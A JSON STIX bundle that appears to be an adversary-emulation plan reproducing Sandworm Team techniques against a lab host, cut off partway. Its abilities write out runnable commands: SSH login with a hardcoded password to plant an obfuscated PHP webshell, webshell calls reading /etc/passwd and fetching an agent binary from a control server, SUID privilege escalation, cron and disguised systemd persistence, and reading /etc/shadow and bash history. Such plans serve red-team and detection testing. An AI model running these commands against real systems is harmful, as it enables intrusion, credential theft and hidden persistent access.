{
    "type": "bundle",
    "id": "bundle--bf87d151-eddc-4b6c-bd7b-12bf536e42e7",
    "objects": [
        {
            "type": "campaign",
            "spec_version": "2.1",
            "id": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "created": "2024-02-04T21:44:08.122818Z",
            "modified": "2024-02-04T21:44:08.122818Z",
            "name": "Sandworm Team (G0034)",
            "description": "Sandworm is a destructive threat group attributed to Russian GRU."
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686",
            "created": "2024-02-04T21:44:08.123075Z",
            "modified": "2024-02-04T21:44:08.123075Z",
            "name": "Sandworm Initial Compromise - Transfer Webshell",
            "description": "Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials\n(perhaps an SSH password guessing attack, or zero day exploit).\nSandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the\nattacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass\nto be installed on attacker-controlled machine (sudo apt install sshpass).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the target host for initial access.",
                            "type": "string"
                        },
                        "initial.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target user account for initial access.",
                            "type": "string"
                        },
                        "initial.user.password": {
                            "default": "Whg42WbhhCE17FEzrqeJ",
                            "description": "The password of the target user account for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "cleanup": "sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} \"sudo rm -f /var/www/html/search.php\";\n",
                                "command": "chmod a+r obfuscated_webShell.php;\nsshpass -p #{initial.user.password} scp ./obfuscated_webShell.php #{initial.user.name}@#{initial.target.host}:/tmp/search.php\n",
                                "payloads": [
                                    "obfuscated_webShell.php"
                                ]
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--3143be1f-0f23-42ae-b117-9a0e480cd8ef",
            "created": "2024-02-04T21:44:08.124197Z",
            "modified": "2024-02-04T21:44:08.124197Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--1750936f-f59c-4f6e-a2ac-fc3ed8cb9a1a",
            "created": "2024-02-04T21:44:08.124747Z",
            "modified": "2024-02-04T21:44:08.124747Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--768308a6-8a89-4a7d-ba49-2a6cd816a48d",
            "created": "2024-02-04T21:44:08.125697Z",
            "modified": "2024-02-04T21:44:08.125697Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686",
            "target_ref": "user-account--41c24890-2cb7-4476-91fb-23c42958568e"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--41c24890-2cb7-4476-91fb-23c42958568e",
            "credential": "Whg42WbhhCE17FEzrqeJ"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--e33214ff-3ebe-43f9-9e71-bfabe3064bee",
            "created": "2024-02-04T21:44:08.12592Z",
            "modified": "2024-02-04T21:44:08.12592Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--60c4ddd6-2ce0-4f5c-8ddb-c5eccd744686"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--6249ff61-75ec-4ead-8ca2-e8d9fbbc225a",
            "created": "2024-02-04T21:44:08.126259Z",
            "modified": "2024-02-04T21:44:08.126259Z",
            "name": "Sandworm Initial Compromise - Deploy Webshell",
            "description": "Sandworm logs into patient zero via SSH using Valid Accounts. It is unknown how Sandworm obtained the credentials\n(perhaps an SSH password guessing attack, or zero day exploit).\nSandworm then deploys a PHP webshell for persistent access. This ability must be run by an agent running on the\nattacker-controlled machine (e.g. on the C2 server itself), since it will target patient zero. Requires sshpass\nto be installed on attacker-controlled machine (sudo apt install sshpass).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1505.003",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the target host for initial access.",
                            "type": "string"
                        },
                        "initial.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target user account for initial access.",
                            "type": "string"
                        },
                        "initial.user.password": {
                            "default": "Whg42WbhhCE17FEzrqeJ",
                            "description": "The password of the target user account for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "cleanup": "sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} \"sudo rm -f /var/www/html/centreon_module_linux_app64\";\nsshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} 'printf \"ps auxf | grep -i httpd\\nnetstat -antp | grep -i httpd\\n\" | sudo tee /var/www/html/include/tools/check.sh > /dev/null'\n",
                                "command": "sshpass -p #{initial.user.password} ssh #{initial.user.name}@#{initial.target.host} \"sudo mv /tmp/search.php /var/www/html/\";\n"
                            }
                        }
                    },
                    "technique_name": "Server Software Component: Web Shell"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--1a388a1b-c6a0-42d5-b144-7b417d0fefbf",
            "created": "2024-02-04T21:44:08.127123Z",
            "modified": "2024-02-04T21:44:08.127123Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--6249ff61-75ec-4ead-8ca2-e8d9fbbc225a",
            "target_ref": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--bee19a41-4767-5188-8cd9-160ef1676f2c",
            "account_login": "fherbert"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--3f44e011-ead3-4e95-9632-d43796066430",
            "created": "2024-02-04T21:44:08.128017Z",
            "modified": "2024-02-04T21:44:08.128017Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--6249ff61-75ec-4ead-8ca2-e8d9fbbc225a",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--48415b75-5434-4885-a21d-68e2f2afd2f2",
            "created": "2024-02-04T21:44:08.142591Z",
            "modified": "2024-02-04T21:44:08.142591Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--6249ff61-75ec-4ead-8ca2-e8d9fbbc225a",
            "target_ref": "user-account--8772d331-78ac-48c3-a29e-695934c2bd3e"
        },
        {
            "type": "user-account",
            "spec_version": "2.1",
            "id": "user-account--8772d331-78ac-48c3-a29e-695934c2bd3e",
            "credential": "Whg42WbhhCE17FEzrqeJ"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--e4619ccd-a28e-4327-b723-76b44b409efa",
            "created": "2024-02-04T21:44:08.142956Z",
            "modified": "2024-02-04T21:44:08.142956Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--6249ff61-75ec-4ead-8ca2-e8d9fbbc225a"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--06dd8117-caaf-4535-a70f-cc31268fd9b8",
            "created": "2024-02-04T21:44:08.143249Z",
            "modified": "2024-02-04T21:44:08.143249Z",
            "name": "Sandworm Initial Discovery via Webshell - Whoami",
            "description": "Sandworm collects the username from a compromised host by issuing shell commands through the PHP webshell.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1033",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host for web shell commands.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "curl --insecure \"https://#{initial.target.host}/search.php?cmd=whoami\" 2>/dev/null\n"
                            }
                        }
                    },
                    "technique_name": "System Owner/User Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--4ff1b1ad-8cf2-456f-88b5-1e3a553aa827",
            "created": "2024-02-04T21:44:08.143962Z",
            "modified": "2024-02-04T21:44:08.143962Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--06dd8117-caaf-4535-a70f-cc31268fd9b8",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--8885bcb2-bf89-4286-a427-ecf8d7e60f11",
            "created": "2024-02-04T21:44:08.144279Z",
            "modified": "2024-02-04T21:44:08.144279Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--06dd8117-caaf-4535-a70f-cc31268fd9b8"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--75efc0b8-eafa-4300-8e7b-5e56179944e8",
            "created": "2024-02-04T21:44:08.144574Z",
            "modified": "2024-02-04T21:44:08.144574Z",
            "name": "Sandworm Initial Discovery via Webshell - Uname",
            "description": "Sandworm enumerates information about the infected system's operating system by issuing shell commands through the\nPHP webshell.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1082",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host for web shell commands.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "curl --insecure \"https://#{initial.target.host}/search.php?cmd=uname+-a\" 2>/dev/null\n"
                            }
                        }
                    },
                    "technique_name": "System Information Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--86c47f01-582a-4fed-932d-16c848064b8d",
            "created": "2024-02-04T21:44:08.145998Z",
            "modified": "2024-02-04T21:44:08.145998Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--75efc0b8-eafa-4300-8e7b-5e56179944e8",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--7b0a739d-f160-4478-96a6-d7bab475447a",
            "created": "2024-02-04T21:44:08.146361Z",
            "modified": "2024-02-04T21:44:08.146361Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--75efc0b8-eafa-4300-8e7b-5e56179944e8"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--65dd006d-a76e-423d-83f2-6c29b66690e1",
            "created": "2024-02-04T21:44:08.146696Z",
            "modified": "2024-02-04T21:44:08.146696Z",
            "name": "Sandworm Initial Discovery via Webshell - ls",
            "description": "Sandworm enumerates files on a compromised host by issuing shell commands through the PHP webshell.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1083",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host for web shell commands.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "curl --insecure \"https://#{initial.target.host}/search.php?cmd=ls+-lsahR+/\" 2>/dev/null\n"
                            }
                        }
                    },
                    "technique_name": "File and Directory Discovery"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--0669ca34-d364-4016-a5ab-a2616c7189e6",
            "created": "2024-02-04T21:44:08.150837Z",
            "modified": "2024-02-04T21:44:08.150837Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--65dd006d-a76e-423d-83f2-6c29b66690e1",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--4d16d40c-70d2-4597-8883-9dda50e0055e",
            "created": "2024-02-04T21:44:08.151158Z",
            "modified": "2024-02-04T21:44:08.151158Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--65dd006d-a76e-423d-83f2-6c29b66690e1"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--c7e4a043-e67a-4199-8e52-d7d5219a7614",
            "created": "2024-02-04T21:44:08.151451Z",
            "modified": "2024-02-04T21:44:08.151451Z",
            "name": "Sandworm Initial Discovery via Webshell - cat /etc/passwd",
            "description": "Sandworm displays the /etc/passwd file on a compromised host by issuing shell commands through the PHP webshell.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1003.008",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host for web shell commands.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "curl --insecure \"https://#{initial.target.host}/search.php?cmd=cat+/etc/passwd\" 2>/dev/null\n"
                            }
                        }
                    },
                    "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--c553e267-41e2-4e5d-9366-ab3d55273d99",
            "created": "2024-02-04T21:44:08.153915Z",
            "modified": "2024-02-04T21:44:08.153915Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--c7e4a043-e67a-4199-8e52-d7d5219a7614",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--8db455eb-e255-450e-925d-cd3b42ff6d1d",
            "created": "2024-02-04T21:44:08.154283Z",
            "modified": "2024-02-04T21:44:08.154283Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--c7e4a043-e67a-4199-8e52-d7d5219a7614"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--a85bd5a0-c977-4fd1-b339-97fffed54f8c",
            "created": "2024-02-04T21:44:08.154586Z",
            "modified": "2024-02-04T21:44:08.154586Z",
            "name": "Sandworm Download Agent Executable",
            "description": "Sandworm downloads an ELF executable from the control server using curl.\nOnce downloaded to disk, Sandworm sets the file permissions to read-write-execute.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1105",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "curl --insecure \"https://#{initial.target.host}/search.php?cmd=curl+--insecure+-X+POST+-H+file:sandcat.go+-H+platform:linux+-H+server:#{server}+-H+group:caladan+#{server}/file/download+-o+centreon_module_linux_app64\" 2>/dev/null;\ncurl --insecure \"https://#{initial.target.host}/search.php?cmd=ls+-lsah\" 2>/dev/null;\ncurl --insecure \"https://#{initial.target.host}/search.php?cmd=chmod+755+centreon_module_linux_app64\" 2>/dev/null;\n"
                            }
                        }
                    },
                    "technique_name": "Ingress Tool Transfer"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--c8976118-769c-4800-9559-eff00cd1ce97",
            "created": "2024-02-04T21:44:08.182482Z",
            "modified": "2024-02-04T21:44:08.182482Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--a85bd5a0-c977-4fd1-b339-97fffed54f8c",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--6732831f-ae08-47c7-861d-8f9e8ea4046b",
            "created": "2024-02-04T21:44:08.182802Z",
            "modified": "2024-02-04T21:44:08.182802Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--a85bd5a0-c977-4fd1-b339-97fffed54f8c"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--decf0a4d-6ff1-474f-af0c-5b652401a5e4",
            "created": "2024-02-04T21:44:08.183073Z",
            "modified": "2024-02-04T21:44:08.183073Z",
            "name": "Sandworm Set Up SUID for Agent Execution",
            "description": "Sandworm executes the downloaded agent executable by running SUID binary /bin/backup.\nThis binary executes check.sh, which causes the agent to be executed with root privileges.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1548.001",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "curl --insecure \"https://#{initial.target.host}/search.php?cmd=echo%20%27%2Fvar%2Fwww%2Fhtml%2Fcentreon_module_linux_app64%20%26%27%20%3E%3E%20%2Fvar%2Fwww%2Fhtml%2Finclude%2Ftools%2Fcheck.sh\" 2>/dev/null;\n"
                            }
                        }
                    },
                    "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--80cb5bbd-bc71-4040-857f-5166b2a151a6",
            "created": "2024-02-04T21:44:08.187701Z",
            "modified": "2024-02-04T21:44:08.187701Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--decf0a4d-6ff1-474f-af0c-5b652401a5e4",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--44f520db-ee05-4e31-b6d4-f63795496f3c",
            "created": "2024-02-04T21:44:08.188046Z",
            "modified": "2024-02-04T21:44:08.188046Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--decf0a4d-6ff1-474f-af0c-5b652401a5e4"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--8ba8405b-d8b9-4c9d-ae8e-3b21ae8f64c6",
            "created": "2024-02-04T21:44:08.18853Z",
            "modified": "2024-02-04T21:44:08.18853Z",
            "name": "Sandworm Execute Agent via SUID Binary",
            "description": "Sandworm executes the downloaded agent executable by running SUID binary /bin/backup.\nThis binary executes check.sh, which causes the agent to be executed with root privileges.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself),\nsince it will target patient zero. Requires curl to be installed on the attacker-controlled machine.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1548.001",
                    "input_arguments": {
                        "initial.target.host": {
                            "default": "10.0.1.5",
                            "description": "The hostname or IPv4 address of the initial target host.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "proc": {
                                "command": "exec-background curl -s --insecure \"https://#{initial.target.host}/search.php?cmd=/bin/backup\"\n"
                            }
                        }
                    },
                    "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--ebb99336-670e-4f86-abe4-2a8f83fc16a1",
            "created": "2024-02-04T21:44:08.224174Z",
            "modified": "2024-02-04T21:44:08.224174Z",
            "relationship_type": "uses",
            "source_ref": "attack-pattern--8ba8405b-d8b9-4c9d-ae8e-3b21ae8f64c6",
            "target_ref": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a"
        },
        {
            "type": "ipv4-addr",
            "spec_version": "2.1",
            "id": "ipv4-addr--c9486de0-14b5-56ac-ad89-0a236c60ae1a",
            "value": "10.0.1.5"
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--4d074feb-7f0c-4f87-8449-6265fb8571b4",
            "created": "2024-02-04T21:44:08.224451Z",
            "modified": "2024-02-04T21:44:08.224451Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--8ba8405b-d8b9-4c9d-ae8e-3b21ae8f64c6"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--c3f875d8-ab9b-46ef-acf6-7926f7b93d78",
            "created": "2024-02-04T21:44:08.224683Z",
            "modified": "2024-02-04T21:44:08.224683Z",
            "name": "Sandworm Wait For Priv Esc Agent Beacon",
            "description": "Wait for the SUID privilege escalation to spawn an elevated agent beacon.\nThis ability must be run by an agent running on the attacker-controlled machine (e.g. on the C2 server itself).\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1548.001",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "sh": {
                                "command": "sleep 40\n"
                            }
                        }
                    },
                    "technique_name": "Abuse Elevation Control Mechanism: Setuid and Setgid"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--6ec1f16d-08d3-4f78-963a-4c186427b0d2",
            "created": "2024-02-04T21:44:08.224917Z",
            "modified": "2024-02-04T21:44:08.224917Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--c3f875d8-ab9b-46ef-acf6-7926f7b93d78"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--f6d72009-d093-461a-986c-e1ab9b04db51",
            "created": "2024-02-04T21:44:08.225125Z",
            "modified": "2024-02-04T21:44:08.225125Z",
            "name": "Sandworm Establish Crontab Persistence",
            "description": "Sandworm establishes crontab persistence.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1053.003",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "sh": {
                                "cleanup": "crontab -r\n",
                                "command": "dir=$(dirname #{location});\ncroncontents=$(crontab -l 2>/dev/null);\nprintf \"$croncontents\\n1 * * * * cd $dir && #{exe_name}\\n@reboot cd $dir && #{exe_name}\\n\" | crontab -\n"
                            }
                        }
                    },
                    "technique_name": "Scheduled Task/Job: Cron"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--e37f3b5b-d2ac-4a96-9ecd-5e5d5b7b984e",
            "created": "2024-02-04T21:44:08.225309Z",
            "modified": "2024-02-04T21:44:08.225309Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--f6d72009-d093-461a-986c-e1ab9b04db51"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--82d61362-0f60-45d9-a3e1-26ec20cb3387",
            "created": "2024-02-04T21:44:08.226781Z",
            "modified": "2024-02-04T21:44:08.226781Z",
            "name": "Sandworm Establish Systemd Persistence",
            "description": "Sandworm establishes systemd persistence.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1543.002",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "sh": {
                                "cleanup": "systemctl disable syslogd.service;\nsystemctl stop syslogd.service;\nrm -f /etc/systemd/system/syslogd.service;\n",
                                "command": "printf \"[Unit]\\nDescription=Syslog daemon\\n\\n[Service]\\nWorkingDirectory=$(dirname #{location})\\nExecStartPre=/bin/rm -f /tmp/.applocktx\\nExecStart=#{location}\\nRestart=always\\n\\n[Install]\\nWantedBy=multi-user.target\" > /etc/systemd/system/syslogd.service;\nchmod 0644 /etc/systemd/system/syslogd.service;\nsystemctl enable syslogd.service;\nsystemctl daemon-reload;\n"
                            }
                        }
                    },
                    "technique_name": "Create or Modify System Process: Systemd Service"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--05fd8c31-5d2a-4aef-a173-ac85d55d5a64",
            "created": "2024-02-04T21:44:08.227005Z",
            "modified": "2024-02-04T21:44:08.227005Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--82d61362-0f60-45d9-a3e1-26ec20cb3387"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--8e965415-40be-40f8-8786-da4f67748fef",
            "created": "2024-02-04T21:44:08.227207Z",
            "modified": "2024-02-04T21:44:08.227207Z",
            "name": "Sandworm Read /etc/shadow",
            "description": "Sandworm reads /etc/shadow. Note: not in CTI but in TTP scope.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1003.008",
                    "input_arguments": null,
                    "platforms": {
                        "linux": {
                            "proc": {
                                "command": "cat /etc/shadow"
                            }
                        }
                    },
                    "technique_name": "OS Credential Dumping: /etc/passwd and /etc/shadow"
                }
            }
        },
        {
            "type": "relationship",
            "spec_version": "2.1",
            "id": "relationship--1d6bffac-36cf-48ef-8312-1e8ee7ff343b",
            "created": "2024-02-04T21:44:08.227385Z",
            "modified": "2024-02-04T21:44:08.227385Z",
            "relationship_type": "uses",
            "source_ref": "campaign--c397ca4d-3c68-414e-9f78-2a96a11edbef",
            "target_ref": "attack-pattern--8e965415-40be-40f8-8786-da4f67748fef"
        },
        {
            "type": "attack-pattern",
            "spec_version": "2.1",
            "id": "attack-pattern--40934e60-6b0d-4d3b-a8f5-ad111c6a0abc",
            "created": "2024-02-04T21:44:08.227576Z",
            "modified": "2024-02-04T21:44:08.227576Z",
            "name": "Sandworm Get Bash History",
            "description": "Sandworm reads bash history. Note: not in CTI but in TTP scope.\n",
            "extensions": {
                "extension-definition--5bf0fcc8-98dd-4dc5-ab53-2a1e9b1470f5": {
                    "attack_id": "T1552.003",
                    "input_arguments": {
                        "initial.user.name": {
                            "default": "fherbert",
                            "description": "The name of the target user account for initial access.",
                            "type": "string"
                        }
                    },
                    "platforms": {
                        "linux": {
                            "proc": {
